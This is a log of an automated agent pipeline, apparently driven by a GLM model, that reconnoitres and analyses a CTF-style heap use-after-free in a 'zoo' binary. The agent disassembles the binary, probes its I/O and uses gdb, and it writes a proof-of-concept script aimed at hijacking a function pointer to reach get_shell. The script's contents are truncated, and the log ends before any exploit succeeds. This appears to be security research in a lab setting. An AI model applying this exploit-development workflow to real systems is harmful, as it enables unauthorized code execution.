19:10:03 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

19:10:03 --- S1 Recon ---
19:10:03 === recon (bug_id=-) ===
19:10:03 [recon] → 调用 GLM...
19:10:07 [recon] ← GLM(4.3s): 调工具[checksec, elf_info, identify_libc, list_strings, symbols]
19:10:07 [recon] 我将开始对目标二进制进行系统性侦察。先并行收集基础信息：保护机制、ELF头、libc识别、字符串、符号表。
19:10:07 [recon]   → 工具 checksec({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target"})
19:10:07 [recon]   → 工具 elf_info({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target"})
19:10:07 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target"})
19:10:07 [recon]   → 工具 list_strings({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "max_lines": 120})
19:10:07 [recon]   → 工具 symbols({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "max_lines": 120})
19:10:07 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ read ⏎ alarm ⏎ malloc ⏎ __libc_start_main ⏎ setvbuf ⏎ stdout ⏎ puts ⏎ free ⏎ system ⏎ stdin ⏎ __isoc99_scanf ⏎ stderr ⏎ ...(1949 chars)
19:10:07 [recon]   ← symbols(0.0s): 0000000000403e20 d _DYNAMIC ⏎ 0000000000404000 d _GLOBAL_OFFSET_TABLE_ ⏎ 0000000000402000 R _IO_stdin_used ⏎ 00000000004023d8 r __FRAME_END__ ⏎ 000000...(1807 chars)
19:10:07 [recon]   ← elf_info(0.0s): /work/workspace/0019-2022-35-uaf-20260908-191003/target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l...(4172 chars)
19:10:07 [recon]   ← identify_libc(0.0s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007c1cd264d000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
19:10:07 [recon]   ← checksec(0.2s): [*] '/work/workspace/0019-2022-35-uaf-20260908-191003/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      Cana...(299 chars)
19:10:07 [recon] → 调用 GLM...
19:10:12 [recon] ← GLM(4.8s): 调工具[sections, global_vars, got_plt, cfg, disassemble]
19:10:12 [recon] 基础信息已收集。这是一个动物园管理程序（zoo.c），有 add/remove/report 功能，存在 `get_shell` 函数和 `system` 调用。现在并行收集：sections、global_vars、got_plt、cfg、以及关键函数的反汇编。
19:10:12 [recon]   → 工具 sections({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target"})
19:10:12 [recon]   → 工具 global_vars({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "max_lines": 60})
19:10:12 [recon]   → 工具 got_plt({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target"})
19:10:12 [recon]   → 工具 cfg({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target"})
19:10:12 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "main", "lines": 120})
19:10:12 [recon]   ← sections(0.0s): There are 31 section headers, starting at offset 0x39f8: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4807 chars)
19:10:12 [recon]   ← global_vars(0.0s):     14: 0000000000404080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2) ⏎     15: 0000000000404090     8 OBJECT  GLOBAL DEFAULT   26 stdin@G...(1342 chars)
19:10:12 [recon]   ← got_plt(0.0s): [{"offset": "0000000000403ff0", "type": "R_X86_64_GLOB_DAT", "value": "__libc_start_main@GLIBC_2.34"}, {"offset": "0000000000403ff8", "type": "R_X86_6...(1490 chars)
19:10:12 [recon]   ← disassemble(0.0s): 00000000004018d7 <main>: ⏎   4018d7:	endbr64 ⏎   4018db:	push   rbp ⏎   4018dc:	mov    rbp,rsp ⏎   4018df:	sub    rsp,0x20 ⏎   4018e3:	mov    DWORD PT...(1283 chars)
19:10:13 [recon]   ← cfg(1.1s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(5258 chars)
19:10:13 [recon] → 调用 GLM...
19:10:19 [recon] ← GLM(5.9s): 调工具[disassemble, disassemble, disassemble, disassemble, disassemble, disassemble, disassemble, disassemble]
19:10:19 [recon] 关键信息已清晰。这是一个动物园管理程序，`zoo` 是全局数组（88字节 = 11个8字节指针，索引0-10），有 add/remove/report 三个操作。现在反汇编所有关键函数：add_animal、remove_animal、report_name、get_shell、print、spea
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal", "lines": 200})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "remove_animal", "lines": 120})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "report_name", "lines": 120})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "get_shell", "lines": 30})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "print", "lines": 40})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "speak", "lines": 30})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "init", "lines": 50})
19:10:19 [recon]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "menu", "lines": 80})
19:10:19 [recon]   ← disassemble(0.0s): 00000000004017bf <report_name>: ⏎   4017bf:	endbr64 ⏎   4017c3:	push   rbp ⏎   4017c4:	mov    rbp,rsp ⏎   4017c7:	sub    rsp,0x10 ⏎   4017cb:	mov    r...(2735 chars)
19:10:19 [recon]   ← disassemble(0.0s): 0000000000401677 <remove_animal>: ⏎   401677:	endbr64 ⏎   40167b:	push   rbp ⏎   40167c:	mov    rbp,rsp ⏎   40167f:	sub    rsp,0x10 ⏎   401683:	mov   ...(3192 chars)
19:10:19 [recon]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(5526 chars)
19:10:19 [recon]   ← disassemble(0.0s): 0000000000401290 <print>: ⏎   401290:	endbr64 ⏎   401294:	push   rbp ⏎   401295:	mov    rbp,rsp ⏎   401298:	sub    rsp,0x10 ⏎   40129c:	mov    QWORD P...(597 chars)
19:10:19 [recon]   ← disassemble(0.0s): 00000000004012cd <speak>: ⏎   4012cd:	endbr64 ⏎   4012d1:	push   rbp ⏎   4012d2:	mov    rbp,rsp ⏎   4012d5:	sub    rsp,0x10 ⏎   4012d9:	mov    QWORD P...(326 chars)
19:10:19 [recon]   ← disassemble(0.0s): 0000000000401276 <get_shell>: ⏎   401276:	endbr64 ⏎   40127a:	push   rbp ⏎   40127b:	mov    rbp,rsp ⏎   40127e:	lea    rax,[rip+0xd83]        # 402008...(298 chars)
19:10:19 [recon]   ← disassemble(0.0s): 00000000004012ec <init>: ⏎   4012ec:	endbr64 ⏎   4012f0:	push   rbp ⏎   4012f1:	mov    rbp,rsp ⏎   4012f4:	mov    rax,QWORD PTR [rip+0x2d95]        # ...(913 chars)
19:10:19 [recon]   ← disassemble(0.0s): 000000000040135b <menu>: ⏎   40135b:	endbr64 ⏎   40135f:	push   rbp ⏎   401360:	mov    rbp,rsp ⏎   401363:	sub    rsp,0x10 ⏎   401367:	mov    rax,QWOR...(2081 chars)
19:10:19 [recon] → 调用 GLM...
19:10:24 [recon] ← GLM(4.7s): 调工具[execute, probe_io]
19:10:24 [recon] 所有关键函数已反汇编完成。现在我需要确认几个关键事实： 1. `zoo` 全局数组的精确布局（88字节 = 4字节count + 11个8字节指针？） 2. remove_animal 中 free 后是否清空指针（UAF 关键） 3. probe_io 确认运行时行为  让我先检查 RPATH/R
19:10:24 [recon]   → 工具 execute({"command": "readelf -d /work/workspace/0019-2022-35-uaf-20260908-191003/target | grep -iE 'path|needed|rpath|runpath'"})
19:10:24 [recon]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "steps": "[{\"recv_until\": \">\", \"send\": \"1\"}, {\"recv_until\": \">\", \"s)
19:10:24 [recon]   ← execute(0.0s):  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] ⏎  ⏎ [Command succeeded with exit code 0]
19:10:24 [recon]   ← probe_io(0.2s): RECV: b'2026/09/08 19:10.24: Welcome to ABC Zoo!!!\n2026/09/08 19:10.24: 1) Add animal\n2026/09/08 19:10.24: 2) Remove animal\n2026/09/08 19:10.24: 3)...(584 chars)
19:10:24 [recon] → 调用 GLM...
19:10:30 [recon] ← GLM(6.0s): 调工具[list_strings, execute]
19:10:30 [recon] 运行时行为已确认。关键发现： - 无 RPATH/RUNPATH，仅依赖 libc.so.6 - `print` 函数调用 `system("/usr/bin/date ...")` 输出时间戳前缀 - 菜单交互正常工作  现在让我精确分析 `zoo` 全局变量的布局。从反汇编看： - `zoo` 
19:10:30 [recon]   → 工具 list_strings({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "filter": "/bin/sh"})
19:10:30 [recon]   → 工具 execute({"command": "readelf -x .rodata /work/workspace/0019-2022-35-uaf-20260908-191003/target 2>/dev/null | head -40"})
19:10:30 [recon]   ← list_strings(0.0s): /bin/sh ⏎ 
19:10:30 [recon]   ← execute(0.0s):  ⏎ Hex dump of section '.rodata': ⏎   0x00402000 01000200 00000000 2f62696e 2f736800 ......../bin/sh. ⏎   0x00402010 2f757372 2f62696e 2f646174 65202b...(2036 chars)
19:10:30 [recon] → 调用 GLM...
19:12:06 [recon] ← GLM(95.9s): 调工具[submit_final_result]
19:12:06 [recon] 所有关键事实已收集完毕。让我总结分析结果：  **关键发现汇总：**  1. **`zoo` 全局变量布局** (0x4040c0, 88字节):    - `zoo[0]` (0x4040c0, 4字节 int): animal count    - `zoo[1..11]` (0x4040c8 
19:12:06 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，21286 chars）
19:12:06 [recon] → 调用 GLM...
19:12:13 [recon] ← GLM(6.7s)
19:12:13 [recon] S1 侦察已完成并提交。以下是关键发现摘要：  **二进制概况：** 64位 ELF，无 PIE，Partial RELRO，有 Canary/NX/CET，glibc 2.39，动物园管理程序（zoo.c）。  **核心攻击面（供 S2 分析）：**  1. **remove_animal 释放后
19:12:13 [stage1] 保存 → /work/workspace/0019-2022-35-uaf-20260908-191003/stage1.json
19:12:13 --- S2 Semantic ---
19:12:13 === semantic (bug_id=-) ===
19:12:13 [semantic] → 调用 GLM...
19:12:18 [semantic] ← GLM(5.6s): 调工具[disassemble, disassemble]
19:12:18 [semantic] 我将分析目标二进制文件的语义级漏洞。让我先反汇编关键函数，以验证 S1 事实并建立漏洞证据链。
19:12:18 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "remove_animal", "lines": 120})
19:12:18 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "report_name", "lines": 120})
19:12:18 [semantic]   ← disassemble(0.0s): 0000000000401677 <remove_animal>: ⏎   401677:	endbr64 ⏎   40167b:	push   rbp ⏎   40167c:	mov    rbp,rsp ⏎   40167f:	sub    rsp,0x10 ⏎   401683:	mov   ...(3192 chars)
19:12:18 [semantic]   ← disassemble(0.0s): 00000000004017bf <report_name>: ⏎   4017bf:	endbr64 ⏎   4017c3:	push   rbp ⏎   4017c4:	mov    rbp,rsp ⏎   4017c7:	sub    rsp,0x10 ⏎   4017cb:	mov    r...(2735 chars)
19:12:18 [semantic] → 调用 GLM...
19:12:23 [semantic] ← GLM(4.3s): 调工具[disassemble, disassemble]
19:12:23 [semantic] 两个关键函数已确认。现在让我反汇编 `add_animal` 以验证分配和槽位搜索逻辑，并检查 `print` 和 `speak` 函数。
19:12:23 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal", "lines": 200})
19:12:23 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "print", "lines": 50})
19:12:23 [semantic]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(5526 chars)
19:12:23 [semantic]   ← disassemble(0.0s): 0000000000401290 <print>: ⏎   401290:	endbr64 ⏎   401294:	push   rbp ⏎   401295:	mov    rbp,rsp ⏎   401298:	sub    rsp,0x10 ⏎   40129c:	mov    QWORD P...(597 chars)
19:12:23 [semantic] → 调用 GLM...
19:12:31 [semantic] ← GLM(8.5s): 调工具[disassemble, disassemble]
19:12:31 [semantic] 现在我已经掌握了所有关键函数的完整反汇编代码。让我验证一下关键细节：  1. **remove_animal** (0x401677): 确认了在 `free(zoo[idx]->name)` (0x40175c) 和 `free(zoo[idx])` (0x40177c) 之后，没有指令将 `zo
19:12:31 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "get_shell", "lines": 30})
19:12:31 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "speak", "lines": 30})
19:12:31 [semantic]   ← disassemble(0.0s): 0000000000401276 <get_shell>: ⏎   401276:	endbr64 ⏎   40127a:	push   rbp ⏎   40127b:	mov    rbp,rsp ⏎   40127e:	lea    rax,[rip+0xd83]        # 402008...(298 chars)
19:12:31 [semantic]   ← disassemble(0.0s): 00000000004012cd <speak>: ⏎   4012cd:	endbr64 ⏎   4012d1:	push   rbp ⏎   4012d2:	mov    rbp,rsp ⏎   4012d5:	sub    rsp,0x10 ⏎   4012d9:	mov    QWORD P...(326 chars)
19:12:31 [semantic] → 调用 GLM...
19:13:47 [semantic] ← GLM(75.9s): 调工具[submit_final_result]
19:13:47 [semantic] 所有函数已确认。现在我已经掌握了完整的证据链。让我总结一下我的发现：  **关键发现：**  1. **remove_animal** (0x401677)：在 `free(zoo[idx]->name)` (0x40175c) 和 `free(zoo[idx])` (0x40177c) 之后，`z
19:13:47 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，18036 chars）
19:13:47 [semantic] → 调用 GLM...
19:13:57 [semantic] ← GLM(10.0s)
19:13:57 [semantic] S2 语义漏洞分析已完成。我识别出了两个具有相同根本原因的漏洞：  **BUG-001 (高危): 堆释放后使用 (Heap Use-After-Free) — 悬空指针未置空**  `remove_animal` 函数释放了动物结构体及其名称缓冲区，但**没有**将 `zoo[idx]` 置空。`
19:13:57 [stage2] 保存 → /work/workspace/0019-2022-35-uaf-20260908-191003/stage2.json
19:13:57 --- S3 Primitive（所有 bug） ---
19:13:57 === impact (bug_id=BUG-001) ===
19:13:57 [impact:BUG-001] → 调用 GLM...
19:14:03 [impact:BUG-001] ← GLM(5.4s): 调工具[disassemble, disassemble, disassemble]
19:14:03 [impact:BUG-001] 我将分析 BUG-001 (UAF 悬空指针未置空) 并推导/验证其原语。让我先从理解二进制结构和 UAF 链开始。
19:14:03 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "remove_animal"})
19:14:03 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "report_name"})
19:14:03 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal"})
19:14:03 [impact:BUG-001]   ← disassemble(0.0s): 00000000004017bf <report_name>: ⏎   4017bf:	endbr64 ⏎   4017c3:	push   rbp ⏎   4017c4:	mov    rbp,rsp ⏎   4017c7:	sub    rsp,0x10 ⏎   4017cb:	mov    r...(2735 chars)
19:14:03 [impact:BUG-001]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(4020 chars)
19:14:03 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401677 <remove_animal>: ⏎   401677:	endbr64 ⏎   40167b:	push   rbp ⏎   40167c:	mov    rbp,rsp ⏎   40167f:	sub    rsp,0x10 ⏎   401683:	mov   ...(3192 chars)
19:14:03 [impact:BUG-001] → 调用 GLM...
19:14:08 [impact:BUG-001] ← GLM(5.4s): 调工具[disassemble, disassemble, disassemble]
19:14:08 [impact:BUG-001] 现在让我看看 `add_animal` 的其余部分，并检查 `get_shell` 函数：
19:14:08 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal", "lines": 50})
19:14:08 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "get_shell"})
19:14:08 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "speak"})
19:14:08 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401276 <get_shell>: ⏎   401276:	endbr64 ⏎   40127a:	push   rbp ⏎   40127b:	mov    rbp,rsp ⏎   40127e:	lea    rax,[rip+0xd83]        # 402008...(298 chars)
19:14:08 [impact:BUG-001]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(1981 chars)
19:14:08 [impact:BUG-001]   ← disassemble(0.0s): 00000000004012cd <speak>: ⏎   4012cd:	endbr64 ⏎   4012d1:	push   rbp ⏎   4012d2:	mov    rbp,rsp ⏎   4012d5:	sub    rsp,0x10 ⏎   4012d9:	mov    QWORD P...(326 chars)
19:14:08 [impact:BUG-001] → 调用 GLM...
19:14:11 [impact:BUG-001] ← GLM(2.8s): 调工具[read_file, disassemble]
19:14:11 [impact:BUG-001] 好的。现在让我查看 `add_animal` 的剩余部分（`read` 和 `store` 部分），并探测 I/O 以了解菜单时序：
19:14:11 [impact:BUG-001]   → 工具 read_file({"file_path": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "limit": 1, "offset": 0})
19:14:11 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "print"})
19:14:11 [impact:BUG-001]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0019-2022-35-uaf-20260908-191003/target': 'utf-8' codec can't decode byte 0x90 in position 24: invalid star...(156 chars)
19:14:11 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401290 <print>: ⏎   401290:	endbr64 ⏎   401294:	push   rbp ⏎   401295:	mov    rbp,rsp ⏎   401298:	sub    rsp,0x10 ⏎   40129c:	mov    QWORD P...(597 chars)
19:14:11 [impact:BUG-001] → 调用 GLM...
19:14:13 [impact:BUG-001] ← GLM(2.7s): 调工具[probe_io]
19:14:13 [impact:BUG-001] 现在让我探测一下 I/O 以了解菜单交互：
19:14:13 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "steps": "[{\"recv_until\": \"0\", \"send\": \"1\"}, {\"recv_until\": \"\", \"se)
19:14:14 [impact:BUG-001]   ← probe_io(0.1s): RECV: b'20' ⏎ SEND: '1' ⏎ SEND: '1' ⏎ SEND: '16' ⏎ SEND: 'AAAA' ⏎ RECV: b'26/0' ⏎ SEND: '0' ⏎ RECV_TAIL: b'9/08 19:14.14'
19:14:14 [impact:BUG-001] → 调用 GLM...
19:14:17 [impact:BUG-001] ← GLM(3.4s): 调工具[probe_io]
19:14:17 [impact:BUG-001] 输出被截断了。让我尝试另一种方法来更好地理解 I/O：
19:14:17 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "input": "1\n1\n16\nAAAA\n3\n0\n0\n", "max_lines": 100})
19:14:17 [impact:BUG-001]   ← probe_io(0.0s): 00000000: 3230 3236 2f30 392f 3038 2031 393a 3134  2026/09/08 19:14 ⏎ 00000010: 2e31 373a 2057 656c 636f 6d65 2074 6f20  .17: Welcome to  ⏎ 00000020: ...(7000 chars)
19:14:17 [impact:BUG-001] → 调用 GLM...
19:14:22 [impact:BUG-001] ← GLM(5.5s): 调工具[disassemble]
19:14:22 [impact:BUG-001] 我现在理解了 I/O。菜单使用了 `scanf("%d")`，它会消耗数字，但 `read()` 调用会读取原始字节。让我理解一下关键点：在 `scanf("%d")` 读取 `name_length` 后，下一个 `read(0, buf, name_length)` 会读取原始字节。但是 `sc
19:14:22 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal", "lines": 200})
19:14:22 [impact:BUG-001]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(5526 chars)
19:14:22 [impact:BUG-001] → 调用 GLM...
19:15:05 [impact:BUG-001] ← GLM(42.5s): 调工具[write_file]
19:15:05 [impact:BUG-001] 现在我已经掌握了全貌。让我来分析一下 UAF 链：  1. `add_animal`：分配 24 字节的结构体（`malloc(0x18)`），分配 name buffer（`malloc(name_length)`），通过 `read()` 读取 name，将结构体指针存储在 `zoo[idx]`
19:15:05 [impact:BUG-001]   → 工具 write_file({"file_path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification)
19:15:05 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py
19:15:05 [impact:BUG-001] → 调用 GLM...
19:15:07 [impact:BUG-001] ← GLM(1.8s): 调工具[run_script]
19:15:07 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "timeout": 30})
19:15:10 [impact:BUG-001]   ← run_script(3.2s): rc=1 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-001: HEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_...(1105 chars)
19:15:10 [impact:BUG-001] → 调用 GLM...
19:15:19 [impact:BUG-001] ← GLM(8.9s): 调工具[edit_file]
19:15:19 [impact:BUG-001] 返回码为 None，意味着进程没有正常退出。问题在于 `p.wait()` 没有获取到返回码。让我来修复脚本以正确处理这个问题：
19:15:19 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "old_string": "    # Check if process crashed\n    p.wait(timeout=3)\)
19:15:19 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py'
19:15:19 [impact:BUG-001] → 调用 GLM...
19:15:25 [impact:BUG-001] ← GLM(5.6s): 调工具[edit_file]
19:15:25 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "new_string": "    try:\n        data = p.recv(timeout=3)\n        pr)
19:15:25 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py'
19:15:25 [impact:BUG-001] → 调用 GLM...
19:15:29 [impact:BUG-001] ← GLM(4.1s): 调工具[run_script]
19:15:29 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "timeout": 30})
19:15:32 [impact:BUG-001]   ← run_script(3.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-001: HEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_...(1359 chars)
19:15:32 [impact:BUG-001] → 调用 GLM...
19:15:36 [impact:BUG-001] ← GLM(4.2s): 调工具[gdb_run]
19:15:36 [impact:BUG-001] 返回码为 None，因为进程可能仍在运行（alarm(60)）。而且 PRIM-003 没有崩溃，因为结构体内存仍然包含旧的 `speak` 指针。让我使用 gdb 来正确验证 UAF 链。我将使用 gdb 在 `call rdx` 指令 (0x4018bf) 处设置断点，并检查 rdx 是否包含我
19:15:36 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x4018bf; run < /work/workspace/0019-2022-35-uaf-20260908-191003)
19:15:36 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4018bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3516 chars)
19:15:36 [impact:BUG-001] → 调用 GLM...
19:15:43 [impact:BUG-001] ← GLM(6.7s): 调工具[gdb_run]
19:15:43 [impact:BUG-001] 有趣！断点在 0x4018bf 处触发，但 rdx = 0x4012cd (speak)，而不是 0x4141414141414141。然而，查看 rax 指向的内存，我可以看到我们的 payload (0x4141414141414141, 0x0000000000000000, 0x424242
19:15:43 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x4018bf; run < /work/workspace/0019-2022-35-uaf-20260908-191003)
19:15:43 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4018bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3566 chars)
19:15:43 [impact:BUG-001] → 调用 GLM...
19:15:50 [impact:BUG-001] ← GLM(7.2s): 调工具[gdb_run]
19:15:50 [impact:BUG-001] 现在我清楚地看到了问题所在。`zoo[0]` (0x4040c8) = 0x4052a0，`zoo[1]` (0x4040d0) = 0x4052a0。等等，它们是同一个地址？这不对。让我检查一下：  - `rax` = 0x4052c0（这是 `report_name` 在 0x40189d 处从
19:15:50 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x40189d; run < /work/workspace/0019-2022-35-uaf-20260908-191003)
19:15:50 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x40189d ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3436 chars)
19:15:50 [impact:BUG-001] → 调用 GLM...
19:18:22 [impact:BUG-001] ← GLM(151.3s)
19:18:22 [impact:BUG-001] 现在我清楚地看到了问题所在。在 0x40189d 处，rax = zoo[0] = 0x4052a0。位于 0x4052a0 的结构体内存仍然包含原始值： - +0x00: 0x4012cd (speak 函数指针) - 未更改 - +0x08: 0x00000000 (类型) - +0x10: 0
19:18:22 [retry] 无 submit（1/5），原地重试...
19:18:22 [impact:BUG-001] → 调用 GLM...
19:18:26 [impact:BUG-001] ← GLM(4.7s): 调工具[gdb_run]
19:18:26 [impact:BUG-001] 我需要重新思考堆重用策略。问题在于 `add_animal` 在分配 name buffer 之前先分配了 struct，因此 tcache LIFO 意味着 name 永远不会落在 struct 内存上。让我尝试一种不同的方法——使用两次 free 操作来重排 tcache：
19:18:26 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x40189d; b *0x4014ad; b *0x4015b8; run < /work/workspace/0019-2)
19:18:42 [impact:BUG-001]   ← gdb_run(15.9s): gdb timed out (15s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:18:42 [impact:BUG-001] → 调用 GLM...
19:21:04 [impact:BUG-001] ← GLM(142.1s): 调工具[write_file]
19:21:04 [impact:BUG-001] gdb 命令包含过多的 continue 语句，导致了超时。让我换一种更简单的方法——直接使用带有正确 stdin 的 gdb 来检查堆地址：
19:21:04 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification PoC for BUG-001\nHEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_NULLIFIED\n\nStrategy)
19:21:04 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py
19:21:04 [impact:BUG-001] → 调用 GLM...
19:21:07 [impact:BUG-001] ← GLM(3.0s): 调工具[run_script]
19:21:07 [impact:BUG-001] 现在让我运行脚本生成 stdin 文件，然后用 gdb 验证 tcache 填充方法：
19:21:07 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "timeout": 15})
19:21:08 [impact:BUG-001]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-001: HEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_...(1104 chars)
19:21:08 [impact:BUG-001] → 调用 GLM...
